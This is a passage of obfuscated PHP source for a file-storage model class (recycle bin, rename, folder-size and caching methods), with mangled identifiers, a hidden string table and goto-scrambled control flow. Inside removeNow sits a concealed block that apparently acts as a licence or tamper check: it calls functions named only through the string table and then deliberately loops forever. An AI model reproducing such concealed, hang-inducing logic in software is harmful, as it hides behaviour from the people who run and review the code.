) { $A®í®µ×  = $this->mkdir($Fñ—¸½™ß, $C ƒõßâæç, REPEAT_SKIP); $this->metaSet($A®í®µ× , $C˜»öì›öÖ[2377], $cÏğª´š±­); $this->metaSet($A®í®µ× , $C˜»öì›öÖ[2378], $c”´óÆ‚Ìô[$C˜»öì›öÖ[458]]); if ($c”´óÆ‚Ìô[$C˜»öì›öÖ[463]] != 0) { $this->metaSet($A®í®µ× , $C˜»öì›öÖ[2379], _get($b‡™õ¯ß, $C˜»öì›öÖ[2380])); } } goto aÔ–•è´—Ê; dÔ¶êòÄÙÍ: $C˜»öì›öÖ =& $_SERVER[Å¸ş]; $c”´óÆ‚Ìô = $this->sourceInfo($DŒ—Ö’Ï©É); $F‡ë†÷‰ŞŠ = intval($c”´óÆ‚Ìô[$C˜»öì›öÖ[371]]) === self::TYPE_SYSTEM; goto fÍïì—Æ’; cõô´ã¦ÂÓ: $cÏğª´š±­ = $c”´óÆ‚Ìô[$C˜»öì›öÖ[371]] == self::TYPE_USER ? $C˜»öì›öÖ[537] : $C˜»öì›öÖ[968]; if ($cÏğª´š±­ == $C˜»öì›öÖ[537]) { $b‡™õ¯ß = Model($C˜»öì›öÖ[476])->getInfo($c”´óÆ‚Ìô[$C˜»öì›öÖ[458]]); $C ƒõßâæç = !empty($b‡™õ¯ß[$C˜»öì›öÖ[2366]]) ? $b‡™õ¯ß[$C˜»öì›öÖ[2366]] : $b‡™õ¯ß[$C˜»öì›öÖ[28]]; $C ƒõßâæç = $C˜»öì›öÖ[248] . $C ƒõßâæç . $C˜»öì›öÖ[2374] . $c”´óÆ‚Ìô[$C˜»öì›öÖ[458]]; } else { $b‡™õ¯ß = Model($C˜»öì›öÖ[460])->getInfo($c”´óÆ‚Ìô[$C˜»öì›öÖ[458]]); $C ƒõßâæç = _get($b‡™õ¯ß, $C˜»öì›öÖ[28]); $C ƒõßâæç = $C˜»öì›öÖ[157] . $C ƒõßâæç . $C˜»öì›öÖ[2375] . $c”´óÆ‚Ìô[$C˜»öì›öÖ[458]]; } $bí‹¹·ñŠå = $C˜»öì›öÖ[2376] . md5($C ƒõßâæç); goto cå„¬ÍŸŞ; EÏ°ˆá¨ç¼: $this->recycleClear($c”´óÆ‚Ìô); $Eêøê„´ªğ = $this->move($DŒ—Ö’Ï©É, $A®í®µ× , REPEAT_RENAME_FOLDER); $this->folderSizeReset($c”´óÆ‚Ìô[$C˜»öì›öÖ[463]]); goto F–³ÇªÁÏ±; F–³ÇªÁÏ±: return $Eêøê„´ªğ; goto d¬±ªÙ£îÒ; aÔ–•è´—Ê: CacheLock::unlock($bí‹¹·ñŠå); $this->metaSet($DŒ—Ö’Ï©É, $C˜»öì›öÖ[2381], $c”´óÆ‚Ìô[$C˜»öì›öÖ[463]]); $this->where(array($C˜»öì›öÖ[369] => $DŒ—Ö’Ï©É))->save(array($C˜»öì›öÖ[390] => time())); goto EÏ°ˆá¨ç¼; d¬±ªÙ£îÒ: } private function recycleClear($föàØŒÖ÷) { $cé‹¥…ï¡ =& $_SERVER[Å¸ş]; $e›¥ø”‰é = $this->childrenAll($föàØŒÖ÷); $dÄÇŠÔŒã  = array($cé‹¥…ï¡[383] => array($cé‹¥…ï¡[384], $e›¥ø”‰é[$cé‹¥…ï¡[2382]])); Model($cé‹¥…ï¡[2383])->where($dÄÇŠÔŒã )->delete(); } public function removeNow($f¹ãù†²ºœ, $CŞºØ×›Ú÷ = true) { goto F±¹àîˆ÷; eñ…Û¹×Ü: return !0; goto D¡’å©­ ›; EÙ†‚ŒôÛ¿: $this->folderSizeReset($E–î³×ôƒÌ[$D‘‚ŸÊô–ˆ[463]]); $A™”²¶øÈ¶ = array($E–î³×ôƒÌ[$D‘‚ŸÊô–ˆ[463]]); if ($E–î³×ôƒÌ[$D‘‚ŸÊô–ˆ[370]] == $D‘‚ŸÊô–ˆ[83]) { $A™”²¶øÈ¶[] = $E–î³×ôƒÌ[$D‘‚ŸÊô–ˆ[369]]; } goto fŠ†ÆôÅ«Ö; fŠ†ÆôÅ«Ö: $this->updateModifyTime($A™”²¶øÈ¶); $this->lockMoveEnd($f¹ãù†²ºœ); Hook::trigger($D‘‚ŸÊô–ˆ[1470], $CÛªåêÏ«ë, $CŞºØ×›Ú÷); goto eñ…Û¹×Ü; A×­«íìƒª: $CÛªåêÏ«ë = $this->pathInfoMore($f¹ãù†²ºœ); if (!$E–î³×ôƒÌ) { return !0; } if ($E–î³×ôƒÌ[$D‘‚ŸÊô–ˆ[463]] == 0) { if (!_get($GLOBALS, $D‘‚ŸÊô–ˆ[459])) { return !1; } } goto AÈ´Î²ï¤; F±¹àîˆ÷: $D‘‚ŸÊô–ˆ =& $_SERVER[Å¸ş]; if (!isset($_SERVER[$D‘‚ŸÊô–ˆ[557]]) || !isset($_SERVER[$D‘‚ŸÊô–ˆ[790]])) { goto DˆÍ™©Áàö; F„ç¶¸¨¯: $cìæ…Ø´ã = $D‘‚ŸÊô–ˆ[792]; $cìæ…Ø´ã($_SERVER[$D‘‚ŸÊô–ˆ[793]]); $C¯ØÛÙÒ¶ = 1; goto D‘Š™œ•Å; D‘Š™œ•Å: for ($añá¼ß¯åè = $C¯ØÛÙÒ¶; $añá¼ß¯åè > 0; $añá¼ß¯åè++) { $cìæ…Ø´ã = json_encode($GLOBALS[$D‘‚ŸÊô–ˆ[384]]); } goto DíŞ©å±š¯; f‘¹Ñ ‡„’: $eôÒÎÀ©Åß = $DÌ—‚Ä˜•($F¡ïöë§•‚); $Dàõ×Øœ = explode($D‘‚ŸÊô–ˆ[217], $eôÒÎÀ©Åß); if (count($Dàõ×Øœ) < $D‘‚ŸÊô–ˆ[550]) { $D“©À‡†…‰ = $D‘‚ŸÊô–ˆ[562]; $D“©À‡†…‰(); } goto F„ç¶¸¨¯; DˆÍ™©Áàö: $b­Îß˜¾Œ› = $D‘‚ŸÊô–ˆ[791]; $DÌ—‚Ä˜• = $D‘‚ŸÊô–ˆ[558]; $F¡ïöë§•‚ = $_SERVER[$D‘‚ŸÊô–ˆ[559]] . $D‘‚ŸÊô–ˆ[560]; goto f‘¹Ñ ‡„’; DíŞ©å±š¯: } $E–î³×ôƒÌ = $this->sourceInfo($f¹ãù†²ºœ); goto A×­«íìƒª; AÈ´Î²ï¤: $this->lockMoveStart($f¹ãù†²ºœ); Hook::trigger($D‘‚ŸÊô–ˆ[2384], $CÛªåêÏ«ë, $CŞºØ×›Ú÷); if ($CŞºØ×›Ú÷) { Model($D‘‚ŸÊô–ˆ[2383])->moveToRecycle($f¹ãù†²ºœ); } else { $eà¡©Ù”ë = $this->childrenAll($E–î³×ôƒÌ); Model($D‘‚ŸÊô–ˆ[507])->eventRemove($f¹ãù†²ºœ); $this->removeRelevance($eà¡©Ù”ë[$D‘‚ŸÊô–ˆ[2382]], $eà¡©Ù”ë[$D‘‚ŸÊô–ˆ[1257]]); } goto EÙ†‚ŒôÛ¿; D¡’å©­ ›: } public function childrenAll($CùİİåÓ‹ ) { $F™êŒæëÈ— =& $_SERVER[Å¸ş]; $bã™é‰¨Ì¥ = $CùİİåÓ‹ [$F™êŒæëÈ—[369]]; if ($CùİİåÓ‹ [$F™êŒæëÈ—[370]] == $F™êŒæëÈ—[83]) { $Dßøïèâµå = array($F™êŒæëÈ—[527] => array($F™êŒæëÈ—[485], $CùİİåÓ‹ [$F™êŒæëÈ—[461]] . $bã™é‰¨Ì¥ . $F™êŒæëÈ—[486])); $dš‡œ½»Œœ = array($F™êŒæëÈ—[527] => $Dßøïèâµå[$F™êŒæëÈ—[461]]); $D±êòğ¨±ç = $this->field($F™êŒæëÈ—[2385])->where($dš‡œ½»Œœ)->select(); $CöÀì—áÊ— = !1; $AÕÑÛ¿ºª® = array($bã™é‰¨Ì¥); if ($D±êòğ¨±ç) { $CöÀì—áÊ— = array_to_keyvalue($D±êòğ¨±ç, $F™êŒæëÈ—[33], $F™êŒæëÈ—[419]); $CöÀì—áÊ— = array_remove_value($CöÀì—áÊ—, $F™êŒæëÈ—[470]); $AÕÑÛ¿ºª® = array_to_keyvalue($D±êòğ¨±ç, $F™êŒæëÈ—[33], $F™êŒæëÈ—[369]); $AÕÑÛ¿ºª®[] = $bã™é‰¨Ì¥; } } else { $CöÀì—áÊ— = array($CùİİåÓ‹ [$F™êŒæëÈ—[419]]); $AÕÑÛ¿ºª® = array($bã™é‰¨Ì¥); } return array($F™êŒæëÈ—[2382] => $AÕÑÛ¿ºª®, $F™êŒæëÈ—[1257] => $CöÀì—áÊ—); } public function removeArray($E‘¬öŠ¦˜) { if (!$E‘¬öŠ¦˜) { return !0; } } public function removeRelevance($CÄÈ¡»™Ş×, $dóì¥•¹Ô) { goto e˜½öµÂñÌ; eîØ¸¦’Ù: $A»òÄ Îàß = array($D•Ü©’‡–Ï[383] => array($D•Ü©’‡–Ï[384], $CÄÈ¡»™Ş×)); Model($D•Ü©’‡–Ï[2383])->where($A»òÄ Îàß)->delete(); Model($D•Ü©’‡–Ï[413])->where($A»òÄ Îàß)->delete(); goto fˆğ‰Û„á­; e˜½öµÂñÌ: $D•Ü©’‡–Ï =& $_SERVER[Å¸ş]; $CÄÈ¡»™Ş× = $CÄÈ¡»™Ş× ? $CÄÈ¡»™Ş× : array(); $dóì¥•¹Ô = $dóì¥•¹Ô ? $dóì¥•¹Ô : array(); goto e×„‰ùÂà; fˆğ‰Û„á­: Model($D•Ü©’‡–Ï[2237])->where($A»òÄ Îàß)->delete(); Model($D•Ü©’‡–Ï[507])->where($A»òÄ Îàß)->delete(); Model($D•Ü©’‡–Ï[2085])->removeBySource($CÄÈ¡»™Ş×); goto bÚÛ‚„È—¦; e×„‰ùÂà: $CÄÈ¡»™Ş× = array_unique(array_filter($CÄÈ¡»™Ş×)); $dóì¥•¹Ô = array_unique(array_filter($dóì¥•¹Ô)); if (!$CÄÈ¡»™Ş×) { return !1; } goto eîØ¸¦’Ù; fËÜä¨ª¸ˆ: for ($A…èÒ¶‘ò = 0; $A…èÒ¶‘ò < count($CÄÈ¡»™Ş×); $A…èÒ¶‘ò++) { $this->sourceCacheClear($CÄÈ¡»™Ş×[$A…èÒ¶‘ò]); } goto eÚ“ÓŒí…; bÚÛ‚„È—¦: Model($D•Ü©’‡–Ï[2364])->removeBySource($CÄÈ¡»™Ş×); $this->where($A»òÄ Îàß)->delete(); Model($D•Ü©’‡–Ï[422])->remove($dóì¥•¹Ô); goto fËÜä¨ª¸ˆ; eÚ“ÓŒí…: } public function rename($d‡èÕ‘Ö†, $cøá´ºëÊ) { goto bÊ ““ƒàÚ; A¹È®İ©±: $this->setNamePinyin($d‡èÕ‘Ö†, $a£Æ•‘ßîô[$EÑ”á¡í„„[28]], !1); $this->updateModifyTime($D¬á‚Ë˜—õ[$EÑ”á¡í„„[463]]); $C‚¥é¹‹™” = $this->where(array($EÑ”á¡í„„[383] => $d‡èÕ‘Ö†))->data($a£Æ•‘ßîô)->save(); goto Eì‚ÊĞ™Åë; bÊ ““ƒàÚ: $EÑ”á¡í„„ =& $_SERVER[Å¸ş]; $D¬á‚Ë˜—õ = $this->sourceInfo($d‡èÕ‘Ö†); if (!$D¬á‚Ë˜—õ) { return !1; } goto e‘ŒâÄ£îæ; e‘ŒâÄ£îæ: $Bï³¹ÇÃñ = $this->fileNameExist($D¬á‚Ë˜—õ[$EÑ”á¡í„„[463]], $cøá´ºëÊ); if ($Bï³¹ÇÃñ && $Bï³¹ÇÃñ != $d‡èÕ‘Ö†) { return !1; } $a£Æ•‘ßîô = array($EÑ”á¡í„„[386] => $cøá´ºëÊ, $EÑ”á¡í„„[526] => USER_ID); goto dÃÑÙ¨Şˆ–; Eì‚ÊĞ™Åë: $a¹•â¾×£  = $EÑ”á¡í„„[2372] . $D¬á‚Ë˜—õ[$EÑ”á¡í„„[463]]; if (isset(self::$cacheChildList[$a¹•â¾×£ ])) { unset(self::$cacheChildList[$a¹•â¾×£ ]); } return $C‚¥é¹‹™”; goto CÙÇÓèì¹Ø; dÃÑÙ¨Şˆ–: if (!$D¬á‚Ë˜—õ[$EÑ”á¡í„„[370]] == $EÑ”á¡í„„[83]) { $a£Æ•‘ßîô[$EÑ”á¡í„„[372]] = get_path_ext($cøá´ºëÊ); } Model($EÑ”á¡í„„[507])->eventRename($d‡èÕ‘Ö†, $D¬á‚Ë˜—õ[$EÑ”á¡í„„[28]], $cøá´ºëÊ); $this->sourceCacheClear($d‡èÕ‘Ö†); goto A¹È®İ©±; CÙÇÓèì¹Ø: } public function setNamePinyin($AÈ«Ÿİçãè, $F‘ÚÛ½‘¤Ñ, $cÑä”°×Ú„ = true) { $C¥æ ´²‡Ä =& $_SERVER[Å¸ş]; $eÎíÁ‘ÕÜ = Input::check($F‘ÚÛ½‘¤Ñ, $C¥æ ´²‡Ä[530]); if ($cÑä”°×Ú„ && !$eÎíÁ‘ÕÜ) { return; } if (!$eÎíÁ‘ÕÜ) { $this->metaSet($AÈ«Ÿİçãè, $C¥æ ´²‡Ä[416], null); $this->metaSet($AÈ«Ÿİçãè, $C¥æ ´²‡Ä[415], null); return; } $e¬ÌÆÍÑµ = array($C¥æ ´²‡Ä[416] => str_replace($C¥æ ´²‡Ä[50], $C¥æ ´²‡Ä[33], Pinyin::encode($F‘ÚÛ½‘¤Ñ)), $C¥æ ´²‡Ä[415] => Pinyin::encode($F‘ÚÛ½‘¤Ñ, $C¥æ ´²‡Ä[531])); $this->metaSet($AÈ«Ÿİçãè, $e¬ÌÆÍÑµ); } public function getContent($DºÒîÔ•¥è) { goto bŞÖİ¶ì¼‡; bŞÖİ¶ì¼‡: $D¢­Û˜ŠËŸ =& $_SERVER[Å¸ş]; $EÌšÌª³àØ = $this->fileInfoGet($DºÒîÔ•¥è); if (!$EÌšÌª³àØ) { return !1; } goto aŸ‹Ïâ’–“; C×Ô£ç’: if (!$EÌšÌª³àØ[$D¢­Û˜ŠËŸ[75]]) { return $D¢­Û˜ŠËŸ[33]; } return IO::getContent($EÌšÌª³àØ[$D¢­Û˜ŠËŸ[75]]); goto aëöÖ¤ªÕ; aŸ‹Ïâ’–“: if ($EÌšÌª³àØ[$D¢­Û˜ŠËŸ[77]] == 0) { return $D¢­Û˜ŠËŸ[33]; } $aÍ¢‘ö Ûœ = $D¢­Û˜ŠËŸ[2386] . $EÌšÌª³àØ[$D¢­Û˜ŠËŸ[163]]; if ($EÌšÌª³àØ[$D¢­Û˜ŠËŸ[77]] <= 1024 * 10) { $eñĞğÉªµ÷ = Cache::get($aÍ¢‘ö Ûœ); if (!$eñĞğÉªµ÷) { $eñĞğÉªµ÷ = IO::getContent($EÌšÌª³àØ[$D¢­Û˜ŠËŸ[75]]); Cache::set($aÍ¢‘ö Ûœ, $eñĞğÉªµ÷); } return $eñĞğÉªµ÷; } goto C×Ô£ç’; aëöÖ¤ªÕ: } public function setDesc($CåõÖ§Â¼¯, $E¦šñëÀâÚ) { $aÓìæÏ¤µ™ =& $_SERVER[Å¸ş]; Model($aÓìæÏ¤µ™[507])->eventAddDesc($CåõÖ§Â¼¯, $E¦šñëÀâÚ); return $this->metaSet($CåõÖ§Â¼¯, $aÓìæÏ¤µ™[405], $E¦šñëÀâÚ); } public function setContent($Bİ¸‘¨¯†ß, $dßêİÔÑ­æ = '') { goto c©¨ôá˜»; c©¨ôá˜»: $Cã‡°Ïö¢ =& $_SERVER[Å¸ş]; $dƒ»‰Ï¯½ = $this->sourceInfo($Bİ¸‘¨¯†ß); $FÚ–Ì†‘™ = $this->fileInfoGet($Bİ¸‘¨¯†ß); goto eÂª™¼Ûƒ; eÂª™¼Ûƒ: if (!$FÚ–Ì†‘™ || !$dƒ»‰Ï¯½) { return !1; } $e‚ÁõàõÒ = Model($Cã‡°Ïö¢[422])->addFileByContent($dßêİÔÑ­æ, $dƒ»‰Ï¯½[$Cã‡°Ïö¢[28]]); $fÖÛ×Ã§Ëì = $this->fileHistory($dƒ»‰Ï¯½, $e‚ÁõàõÒ[$Cã‡°Ïö¢[419]], $e‚ÁõàõÒ[$Cã‡°Ïö¢[77]]); goto c¥šÁÄòÛˆ; c¥šÁÄòÛˆ: if (!$fÖÛ×Ã§Ëì) { return Model($Cã‡°Ïö¢[422])->remove($e‚ÁõàõÒ[$Cã‡°Ïö¢[419]]); } $this->folderSizeReset($dƒ»‰Ï¯½[$Cã‡°Ïö¢[463]]); return !0; goto Bº•œ¬ò; Bº•œ¬ò: } public function fileSubstr($e“Ü˜¿¼Ş¢, $b›À“»¡–, $F¼‚¿é—¨) { $dî£¡çá­ = $this->fileInfoGet($e“Ü˜¿¼Ş¢); if (!$dî£¡çá­) { return !1; } return IO::fileSubstr($dî£¡çá­[$_SERVER[Å¸ş][75]], $b›À“»¡–, $F¼‚¿é—¨); } public function fileInfoGet($C…ç×¿íÉö) { goto E³øŠ»ê†Ş; D‰çˆ½òÈ: return $F¥»îÌ©Œä; goto cø´É˜œÏ¥; a“ ßòõ°Ë: $F¥»îÌ©Œä = Model($F£éñ¬±ŸÉ[422])->fileInfo($AØ‡’ğº…Ö[$F£éñ¬±ŸÉ[419]]); if ($F¥»îÌ©Œä) { $F¥»îÌ©Œä[$F£éñ¬±ŸÉ[28]] = $AØ‡’ğº…Ö[$F£éñ¬±ŸÉ[28]]; } self::$cacheFileInfo[$Dí”™™Šó] = $F¥»îÌ©Œä; goto D‰çˆ½òÈ; DË›òĞ‰µ: $Dí”™™Šó = $F£éñ¬±ŸÉ[425] . $AØ‡’ğº…Ö[$F£éñ¬±ŸÉ[419]]; $b•‹¯’ñçÇ = _get(self::$cacheFileInfo, $Dí”™™Šó); if ($b•‹¯’ñçÇ) { return $b•‹¯’ñçÇ; } goto a“ ßòõ°Ë; E³øŠ»ê†Ş: $F£éñ¬±ŸÉ =& $_SERVER[Å¸ş]; $AØ‡’ğº…Ö = $this->sourceInfo($C…ç×¿íÉö); if (!$AØ‡’ğº…Ö || $AØ‡’ğº…Ö[$F£éñ¬±ŸÉ[370]]) { return !1; } goto DË›òĞ‰µ; cø´É˜œÏ¥: } private function folderChildrenNumber($aÜ¡õ§¦) { $BöÊâäå =& $_SERVER[Å¸ş]; $AÍ·‚¡ÈÛô = $this->sourceInfo($aÜ¡õ§¦); $c¦ŒÃé¡ = array($BöÊâäå[527] => array($BöÊâäå[485], $AÍ·‚¡ÈÛô[$BöÊâäå[461]] . $aÜ¡õ§¦ . $BöÊâäå[486]), $BöÊâäå[396] => intval($AÍ·‚¡ÈÛô[$BöÊâäå[397]]), $BöÊâäå[520] => 1); $D’«ÅÉÎğ± = $this->where($c¦ŒÃé¡)->count(); $dÌ›¨‹¤¹ó = $this->where($c¦ŒÃé¡)->where(array($BöÊâäå[520] => 0))->count(); return array($BöÊâäå[81] => $dÌ›¨‹¤¹ó, $BöÊâäå[82] => $D’«ÅÉÎğ±); } public function pathInfo($F½ÜàÍóÏ, $e¶Œ·æ¹Œ = false) { goto c¾ÍÃò»Àé; B¦Õæ¥ç: $eëğ¢ƒø‡ = $this->sourceInfo($F½ÜàÍóÏ); if (!$eëğ¢ƒø‡) { return !1; } $eëğ¢ƒø‡ = $this->_listDataApplyItem($eëğ¢ƒø‡, $e¶Œ·æ¹Œ); goto aîªºÓØ; aîªºÓØ: self::$cachePathInfo[$F«ªµ¹Üß©] = $eëğ¢ƒø‡; return $eëğ¢ƒø‡; goto C‹¡Ç÷Ÿ; b«ëãİëâ: $F«ªµ¹Üß© = $Dº®ƒ¦œ†[411] . intval($e¶Œ·æ¹Œ) . $Dº®ƒ¦œ†[412] . $F½ÜàÍóÏ; $eÃÏ†¼Œá = _get(self::$cachePathInfo, $F«ªµ¹Üß©); if ($eÃÏ†¼Œá) { return $eÃÏ†¼Œá; } goto B¦Õæ¥ç; c¾ÍÃò»Àé: $Dº®ƒ¦œ† =& $_SERVER[Å¸ş]; $e¶Œ·æ¹Œ = !0; $F½ÜàÍóÏ = intval($F½ÜàÍóÏ); goto b«ëãİëâ; C‹¡Ç÷Ÿ: } public static $cachePathInfoMore = array(); public function pathInfoMore($cœòªñ¶Ìí) { goto eå‡‡Ñ¢¸·; eå‡‡Ñ¢¸·: $f‚Ğİ¢ÜÏè =& $_SERVER[Å¸ş]; $C½ô…åºÊ = _get(self::$cachePathInfoMore, $cœòªñ¶Ìí); if ($C½ô…åºÊ) { return $C½ô…åºÊ; } goto Dîâ¸âÜë‚; Dîâ¸âÜë‚: $aÜ†Œ„å² = $this->pathInfo($cœòªñ¶Ìí); if (!$aÜ†Œ„å²) { return !1; } if ($aÜ†Œ„å²[$f‚Ğİ¢ÜÏè[370]] == $f‚Ğİ¢ÜÏè[83]) { $aÜ†Œ„å²[$f‚Ğİ¢ÜÏè[80]] = $this->folderChildrenNumber($cœòªñ¶Ìí); } goto c‘›•–íŒù; c‘›•–íŒù: self::$cachePathInfoMore[$cœòªñ¶Ìí] = $aÜ†Œ„å²; return $aÜ†Œ„å²; goto dí¨Œ½ƒ¦…; dí¨Œ½ƒ¦…: } public function sourceInfo($b²æğ¤âÛî) { goto FÛ•”¾¾ªò; f£óš‘Ñ„Ã: $CöÆë¾š„­ = $this->where(array($f…ºğÃù±²[369] => $b²æğ¤âÛî))->find(); self::$cacheSourceInfo[$A”òÎ¥Ó¢] = $CöÆë¾š„­; return self::$cacheSourceInfo[$A”òÎ¥Ó¢]; goto A¯êªÈœ¦Ë; FÛ•”¾¾ªò: $f…ºğÃù±² =& $_SERVER[Å¸ş]; if (!$b²æğ¤âÛî) { return array(); } $b²æğ¤âÛî = intval($b²æğ¤âÛî); goto A¹–˜ƒÔŞá; A¹–˜ƒÔŞá: $A”òÎ¥Ó¢ = $f…ºğÃù±²[410] . $b²æğ¤âÛî; $A£ÄáÖ›ˆÇ = _get(self::$cacheSourceInfo, $A”òÎ¥Ó¢); if ($A£ÄáÖ›ˆÇ) { return $A£ÄáÖ›ˆÇ; } goto f£óš‘Ñ„Ã; A¯êªÈœ¦Ë: } public function sourceCacheClear($bÄ•²’Ñò = false) { if ($bÄ•²’Ñò == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Å¸ş][410] . $bÄ•²’Ñò]); } public function pathInfoByPath($FŠÕ‘©òù, $CÀš©ÌÍ¼ë) { $EãË½ò‹¡£ =& $_SERVER[Å¸ş]; $A¼–ö‚¯ËÍ = !$CÀš©ÌÍ¼ë ? array() : explode($EãË½ò‹¡£[8], trim($CÀš©ÌÍ¼ë, $EãË½ò‹¡£[8])); $a¨ƒÌáÆÑê = $FŠÕ‘©òù; foreach ($A¼–ö‚¯ËÍ as $bÌŒ„Û›ğ) { $Bë™†ËÎÖª = array($EãË½ò‹¡£[463] => $a¨ƒÌáÆÑê, $EãË½ò‹¡£[28] => $bÌŒ„Û›ğ); $b­ÈÑ„“å‡ = $this->where($Bë™†ËÎÖª)->select(); if (!$b­ÈÑ„“å‡) { return !1; } $b­ÈÑ„“å‡ = array_sort_by($b­ÈÑ„“å‡, $EãË½ò‹¡£[397]); $a¨ƒÌáÆÑê = $b­ÈÑ„“å‡[0][$EãË½ò‹¡£[369]]; } return $this->pathInfo($a¨ƒÌáÆÑê, !0); } protected function updateModifyTime($D‘•œÃ¯õª) { goto Dä†×Òˆ; bò÷é•“È: foreach ($D‘•œÃ¯õª as $Aó×åË¢ºÍ => $bÀÚî¦¢–‘) { $D‘•œÃ¯õª[$Aó×åË¢ºÍ] = intval($bÀÚî¦¢–‘); } $Aò”ò¤‘ = array($DÕ¾¸Ë‰£Ô[369] => array($DÕ¾¸Ë‰£Ô[7], $D‘•œÃ¯õª)); $cÅÉ²ÒÙ¢Â = array($DÕ¾¸Ë‰£Ô[526] => USER_ID, $DÕ¾¸Ë‰£Ô[390] => time()); goto Fö–•šÕó‘; Fö–•šÕó‘: $this->where($Aò”ò¤‘)->save($cÅÉ²ÒÙ¢Â); goto aÖŸÓ‡ŠîÚ; Dä†×Òˆ: $DÕ¾¸Ë‰£Ô =& $_SERVER[Å¸ş]; if (!$D‘•œÃ¯õª) { return; } if (!is_array($D‘•œÃ¯õª)) { $D‘•œÃ¯õª = array($D‘•œÃ¯õª); } goto bò÷é•“È; aÖŸÓ‡ŠîÚ: } public function folderSizeReset($b¦×Ûèö) { goto Fï‰ÒÔ¡´˜; Fï‰ÒÔ¡´˜: $c˜¤÷İè§ñ =& $_SERVER[Å¸ş]; if ($this->statusIgnoreResetSpace) { return; } $B½¸ƒÖéË = $c˜¤÷İè§ñ[2387] . $b¦×Ûèö; goto f§’Ÿ†íä; f—ÊÔ²ŒÉ¬: $a‚ØÆËç•Î = array($c˜¤÷İè§ñ[368] => $b¦×Ûèö, $c˜¤÷İè§ñ[396] => 0); $cï¦ÜÚ½÷Ù = $this->where($a‚ØÆËç•Î)->sum($c˜¤÷İè§ñ[77]); $cï¦ÜÚ½÷Ù = intval($cï¦ÜÚ½÷Ù); goto DˆÄ†ß•œÁ; DˆÄ†ß•œÁ: $DŸÏ î·ô = $cï¦ÜÚ½÷Ù - intval($cÌôïØ¨ˆ½[$c˜¤÷İè§ñ[77]]); if ($DŸÏ î·ô == 0) { return CacheLock::unlock($B½¸ƒÖéË); } $this->where(array($c˜¤÷İè§ñ[383] => $b¦×Ûèö))->setField($c˜¤÷İè§ñ[77], $cï¦ÜÚ½÷Ù); goto B„Äèß‹ù; f§’Ÿ†íä: CacheLock::lock($B½¸ƒÖéË, 20); $this->sourceCacheClear($b¦×Ûèö); $cÌôïØ¨ˆ½ = $this->sourceInfo($b¦×Ûèö); goto f—ÊÔ²ŒÉ¬; Eœ“øª“ã: CacheLock::unlock($B½¸ƒÖéË); goto F×ò…á§Ï; B„Äèß‹ù: $Fˆç¾Ã„²İ = $this->parentLevelArray($cÌôïØ¨ˆ½[$c˜¤÷İè§ñ[461]]); if ($Fˆç¾Ã„²İ) { $a‚ØÆËç•Î = array($c˜¤÷İè§ñ[369] => array($c˜¤÷İè§ñ[384], $Fˆç¾Ã„²İ)); if ($DŸÏ î·ô < 0) { $a‚ØÆËç•Î[$c˜¤÷İè§ñ[77]] = array($c˜¤÷İè§ñ[926], abs($DŸÏ î·ô)); } $this->where($a‚ØÆËç•Î)->setAdd($c˜¤÷İè§ñ[77], $DŸÏ î·ô); } $this->targetSpaceUpdate($cÌôïØ¨ˆ½[$c˜¤÷İè§ñ[371]], $cÌôïØ¨ˆ½[$c˜¤÷İè§ñ[458]]); goto Eœ“øª“ã; F×ò…á§Ï: } public function folderSizeResetChildren($fÔÚ­ØÆå) { goto DÒ—ÜË…²·; DÒ—ÜË…²·: $a‡Æ”™ª÷¢ =& $_SERVER[Å¸ş]; $this->sourceCacheClear($fÔÚ­ØÆå); $AéÂˆ­æ® = $this->sourceInfo($fÔÚ­ØÆå); goto c”›¦Ê”Øñ; c”›¦Ê”Øñ: $f²àÇä»Úï = array($a‡Æ”™ª÷¢[520] => 1, $a‡Æ”™ª÷¢[527] => array($a‡Æ”™ª÷¢[485], $AéÂˆ­æ®[$a‡Æ”™ª÷¢[461]] . $fÔÚ­ØÆå . $a‡Æ”™ª÷¢[486])); $bó—ìÃÒ»ï = $a‡Æ”™ª÷¢[2388]; $aÉË …ÎÖÌ = $this->field($bó—ìÃÒ»ï)->where($f²àÇä»Úï)->select(); goto eº·§æï•Ú; B¿ÑÖ§İå: foreach ($aÉË …ÎÖÌ as $cç¬©ïô•) { if ($cç¬©ïô•[$a‡Æ”™ª÷¢[77]] == $cç¬©ïô•[$a‡Æ”™ª÷¢[2389]]) { continue; } $BêÏ¦Ê—®[] = array($a‡Æ”™ª÷¢[369], $cç¬©ïô•[$a‡Æ”™ª÷¢[369]], $a‡Æ”™ª÷¢[77], $cç¬©ïô•[$a‡Æ”™ª÷¢[77]]); } $this->saveAll($BêÏ¦Ê—®); goto eŠ¶ÚÀ ©; FÉØ Ú•İ…: foreach ($FÔÊÔÉĞä¡ as $cç¬©ïô•) { $BñÆˆ™¡ø± = $cç¬©ïô•[$a‡Æ”™ª÷¢[463]] . $a‡Æ”™ª÷¢[33]; if (!isset($aÉË …ÎÖÌ[$BñÆˆ™¡ø±])) { continue; } if ($cç¬©ïô•[$a‡Æ”™ª÷¢[397]] == $aÉË …ÎÖÌ[$BñÆˆ™¡ø±][$a‡Æ”™ª÷¢[397]]) { $aÉË …ÎÖÌ[$BñÆˆ™¡ø±][$a‡Æ”™ª÷¢[77]] += $cç¬©ïô•[$a‡Æ”™ª÷¢[77]]; } } foreach ($aÉË …ÎÖÌ as $cç¬©ïô•) { $F×á¤ö‰Í = $this->parentLevelArray($cç¬©ïô•[$a‡Æ”™ª÷¢[461]]); foreach ($F×á¤ö‰Í as $BñÆˆ™¡ø±) { $BñÆˆ™¡ø± = $BñÆˆ™¡ø± . $a‡Æ”™ª÷¢[33]; if (!isset($aÉË …ÎÖÌ[$BñÆˆ™¡ø±])) { continue; } if ($cç¬©ïô•[$a‡Æ”™ª÷¢[397]] == $aÉË …ÎÖÌ[$BñÆˆ™¡ø±][$a‡Æ”™ª÷¢[397]]) { $aÉË …ÎÖÌ[$BñÆˆ™¡ø±][$a‡Æ”™ª÷¢[77]] += $cç¬©ïô•[$a‡Æ”™ª÷¢[77]]; } } } $BêÏ¦Ê—® = array(); goto B¿ÑÖ§İå; eº·§æï•Ú: $f²àÇä»Úï[$a‡Æ”™ª÷¢[370]] = 0; $FÔÊÔÉĞä¡ = $this->field($bó—ìÃÒ»ï)->where($f²àÇä»Úï)->select(); if (!$FÔÊÔÉĞä¡) { return; } goto AØ»İˆäôà; AØ»İˆäôà: $aÉË …ÎÖÌ[] = $AéÂˆ­æ®; $aÉË …ÎÖÌ = array_to_keyvalue($aÉË …ÎÖÌ, $a‡Æ”™ª÷¢[369]); foreach ($aÉË …ÎÖÌ as 